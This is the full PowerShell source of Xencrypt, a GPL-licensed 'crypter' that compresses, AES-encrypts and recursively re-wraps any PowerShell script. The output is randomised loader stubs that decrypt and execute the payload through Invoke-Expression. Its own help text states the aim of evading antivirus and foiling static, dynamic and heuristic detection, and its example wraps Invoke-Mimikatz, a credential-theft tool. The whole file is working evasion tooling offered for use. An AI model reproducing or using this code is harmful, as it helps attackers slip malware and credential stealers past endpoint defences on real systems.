#    Xencrypt - PowerShell crypter
#    Copyright (C) 2020 Xentropy ( @SamuelAnttila )
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"
$PSDefaultParameterValues['*:ErrorAction']='Stop'

function Create-Var() {
        #Variable length help vary the length of the file generated
        #old: [guid]::NewGuid().ToString().Substring(24 + (Get-Random -Maximum 9))
        $set = "abcdefghijkmnopqrstuvwxyz"
        (1..(4 + (Get-Random -Maximum 6)) | %{ $set[(Get-Random -Minimum 0 -Maximum $set.Length)] } ) -join ''
}

function Invoke-Xencrypt {
    <#
    .SYNOPSIS

    Invoke-Xencrypt takes any PowerShell script as an input and both packs and encrypts it to evade AV. It also lets you layer this recursively however many times you want in order to foil dynamic & heuristic detection.

    .DESCRIPTION

     Invoke-Xencrypt takes any PowerShell script as an input and both packs and encrypts it to evade AV. 
     The output script is highly randomized in order to make static analysis even more difficut.
     It also lets you layer this recursively however many times you want in order to attempt to foil dynamic & heuristic detection.


    .PARAMETER InFile
    Specifies the script to obfuscate/encrypt.

    .PARAMETER OutFile
    Specifies the output script.

    .PARAMETER Iterations
    The number of times the PowerShell script will be packed & crypted recursively. Default is 2.

    .EXAMPLE

    PS> Invoke-Xencrypt -InFile Invoke-Mimikatz.ps1 -OutFile banana.ps1 -Iterations 3

    .LINK

    https://github.com/the-xentropy/xencrypt

    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $infile = $(Throw("-InFile is required")),
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $outfile = $(Throw("-OutFile is required")),
        [Parameter(Mandatory=$false,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $iterations = 2
    )
    Process {
        Write-Output "
Xencrypt  Copyright (C) 2020  Xentropy ( @SamuelAnttila )
This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
This is free software, and you are welcome to redistribute it
under certain conditions.
"

        # read
        Write-Output "[*] Reading '$($infile)' ..."
        $codebytes = [System.IO.File]::ReadAllBytes($infile)


        for ($i = 1; $i -le $iterations; $i++) {
            # Decide on encryption params ahead of time 
            
            Write-Output "[*] Starting code layer  ..."
            $paddingmodes = 'PKCS7','ISO10126','ANSIX923','Zeros'
            $paddingmode = $paddingmodes | Get-Random
            $ciphermodes = 'ECB','CBC'
            $ciphermode = $ciphermodes | Get-Random

            $keysizes = 128,192,256
            $keysize = $keysizes | Get-Random

            $compressiontypes = 'Gzip','Deflate'
            $compressiontype = $compressiontypes | Get-Random

            # compress
            Write-Output "[*] Compressing ..."
            [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
            if ($compressiontype -eq "Gzip") {
                $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
            } elseif ( $compressiontype -eq "Deflate") {
                $compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
            }
      	    $compressionStream.Write( $codebytes, 0, $codebytes.Length )
            $compressionStream.Close()
            $output.Close()
            $compressedBytes = $output.ToArray()

            # generate key
            Write-Output "[*] Generating encryption key ..."
            $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
            if ($ciphermode -eq 'CBC') {
                $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
            } elseif ($ciphermode -eq 'ECB') {
                $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB
            }

            if ($paddingmode -eq 'PKCS7') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            } elseif ($paddingmode -eq 'ISO10126') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
            } elseif ($paddingmode -eq 'ANSIX923') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
            } elseif ($paddingmode -eq 'Zeros') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            }

            $aesManaged.BlockSize = 128
            $aesManaged.KeySize = 256
            $aesManaged.GenerateKey()
            $b64key = [System.Convert]::ToBase64String($aesManaged.Key)

            # encrypt
            Write-Output "[*] Encrypting ..."
            $encryptor = $aesManaged.CreateEncryptor()
            $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length);
            [byte[]] $fullData = $aesManaged.IV + $encryptedData
            $aesManaged.Dispose()
            $b64encrypted = [System.Convert]::ToBase64String($fullData)
        
            # write
            Write-Output "[*] Finalizing code layer ..."

            # now, randomize the order of any statements that we can to further increase variation

            $stub_template = ''

            $code_alternatives  = @()
            $code_alternatives += '${2} = [System.Convert]::FromBase64String("{0}")' + "`r`n"
            $code_alternatives += '${3} = [System.Convert]::FromBase64String("{1}")' + "`r`n"
            $code_alternatives += '${4} = New-Object "System.Security.Cryptography.AesManaged"' + "`r`n"
            $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
            $stub_template += $code_alternatives_shuffled -join ''

            $code_alternatives  = @()
            $code_alternatives += '${4}.Mode = [System.Security.Cryptography.CipherMode]::'+$ciphermode + "`r`n"
            $code_alternatives += '${4}.Padding = [System.Security.Cryptography.PaddingMode]::'+$paddingmode + "`r`n"
            $code_alternatives += '${4}.BlockSize = 128' + "`r`n"
            $code_alternatives += '${4}.KeySize = '+$keysize + "`n" + '${4}.Key = ${3}' + "`r`n"
            $code_alternatives += '${4}.IV = ${2}[0..15]' + "`r`n"
            $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
            $stub_template += $code_alternatives_shuffled -join ''

            $code_alternatives  = @()
            $code_alternatives += '${6} = New-Object System.IO.MemoryStream(,${4}.CreateDecryptor().TransformFinalBlock(${2},16,${2}.Length-16))' + "`r`n"
            $code_alternatives += '${7} = New-Object System.IO.MemoryStream' + "`r`n"
            $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
            $stub_template += $code_alternatives_shuffled -join ''


            if ($compressiontype -eq "Gzip") {
                $stub_template += '${5} = New-Object System.IO.Compression.GzipStream ${6}, ([IO.Compression.CompressionMode]::Decompress)'    + "`r`n"
            } elseif ( $compressiontype -eq "Deflate") {
                $stub_template += '${5} = New-Object System.IO.Compression.DeflateStream ${6}, ([IO.Compression.CompressionMode]::Decompress)' + "`r`n"
            }
            $stub_template += '${5}.CopyTo(${7})' + "`r`n"

            $code_alternatives  = @()
            $code_alternatives += '${5}.Close()' + "`r`n"
            $code_alternatives += '${4}.Dispose()' + "`r`n"
            $code_alternatives += '${6}.Close()' + "`r`n"
            $code_alternatives += '${8} = [System.Text.Encoding]::UTF8.GetString(${7}.ToArray())' + "`r`n"
            $code_alternatives_shuffled = $code_alternatives | Sort-Object {Get-Random}
            $stub_template += $code_alternatives_shuffled -join ''

            $stub_template += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
            
        
            # it's ugly, but it beats concatenating each value manually.
            $code = $stub_template -f $b64encrypted, $b64key, (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var)
            $codebytes = [System.Text.Encoding]::UTF8.GetBytes($code)
        }
        Write-Output "[*] Writing '$($outfile)' ..."
        [System.IO.File]::WriteAllText($outfile,$code)
        Write-Output "[+] Done!"
    }
}
